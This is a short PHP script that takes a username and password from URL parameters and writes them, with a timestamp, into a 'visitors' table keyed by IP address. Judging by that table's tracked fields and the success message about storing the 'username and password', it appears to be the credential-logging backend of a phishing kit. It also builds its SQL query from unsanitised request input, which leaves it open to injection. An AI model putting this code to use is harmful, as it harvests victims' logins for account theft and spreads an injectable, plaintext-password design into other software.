<?php
include 'db.php'; 
//$page_ = "Page 1";
?>
<?php


        $user = $_GET['user'];
        $pass = $_GET['pass'];
        $submitted = $_GET['submitted'];
        $timeStamp =date('Y-m-d H:i:s');
        $ipAddress = $_GET['ipAddress'];
        $log1 = $user."<br>".$pass;
        //country, image, user_agent, current_page, submitted_form, selected_page, timeStamp
        $sql2 = "UPDATE visitors SET submitted_form='$submitted', timeStamp='$timeStamp', log1='$log1' WHERE ip_address='$ipAddress'";
            // Execute the query
            if ($conn->query($sql2) === TRUE) {
                echo "Record updated successfully with username and password ";
            } else {
                echo "Error updating record: " . $conn->error;
            }


?>